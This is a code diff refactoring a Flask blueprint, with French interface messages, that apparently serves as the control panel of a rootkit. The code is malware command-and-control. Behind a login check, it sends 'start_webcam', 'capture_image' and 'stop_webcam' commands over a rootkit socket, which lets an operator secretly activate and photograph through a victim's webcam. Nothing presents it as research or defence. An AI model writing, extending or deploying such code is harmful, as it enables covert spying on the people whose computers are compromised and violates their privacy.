@@ -1,31 +1,31 @@
 from flask import Blueprint, render_template, request, redirect, url_for
-from utils.state import authenticated, rootkit_connection, connection_lock
+import utils.state as state
 import os
 
 webcam_bp = Blueprint('webcam', __name__)
 
 @webcam_bp.route('/', methods=['GET', 'POST'])
 def webcam():
-    if not authenticated:
+    if not state.authenticated:
         return redirect(url_for('auth.login'))
 
     webcam_output = ""
-    image_path = "/var/www/html/images/capture.jpg"  # À adapter si nécessaire
+    image_path = "/var/www/html/images/capture.jpg"
 
     if request.method == 'POST':
         action = request.form.get('action')
 
         try:
-            with connection_lock:
-                if rootkit_connection:
+            with state.connection_lock:
+                if state.rootkit_connection:
                     if action == 'start':
-                        rootkit_connection.sendall(b"start_webcam\n")
+                        state.rootkit_connection.sendall(b"start_webcam\n")
                         webcam_output = "✅ Webcam démarrée."
                     elif action == 'capture':
-                        rootkit_connection.sendall(b"capture_image\n")
+                        state.rootkit_connection.sendall(b"capture_image\n")
                         webcam_output = "📸 Image capturée avec succès."
                     elif action == 'stop':
-                        rootkit_connection.sendall(b"stop_webcam\n")
+                        state.rootkit_connection.sendall(b"stop_webcam\n")
                         webcam_output = "🛑 Webcam arrêtée."
                     else:
                         webcam_output = "❌ Action inconnue."
